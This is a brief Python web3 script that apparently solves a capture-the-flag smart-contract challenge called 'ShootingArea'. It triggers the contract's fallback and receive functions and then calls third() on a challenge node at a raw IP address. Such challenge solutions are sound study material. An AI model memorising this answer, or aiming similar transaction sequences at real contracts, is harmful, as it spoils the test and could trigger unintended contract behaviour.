#https://ctftime.org/writeup/36493

from web3 import Web3
from solcx import compile_files

addr     = "0xf5Eb625F3BCfc73021cCC0cadf935EB22Cbe80d4"
target   = "0x3ac666e2c809Ba6d471ad501925de80d23566599"

compiled = compile_files(["ShootingArea.sol"], output_values=["abi"], solc_version="0.8.18")
abi = compiled['ShootingArea.sol:ShootingArea']['abi']

w3 = Web3(Web3.HTTPProvider('http://68.183.37.122:31550'))
print("current balance", w3.eth.get_balance(addr), "wei")

contract = w3.eth.contract(address=target, abi=abi)

# invalid function added to source with an uint parameter
# first target calls fallback (special function)
contract.functions.invalid(10).transact()
# second target calls receive (special function)
w3.eth.send_transaction({"from":addr, "to":target,"value":1,})
# third target calls third
contract.functions.third().transact()
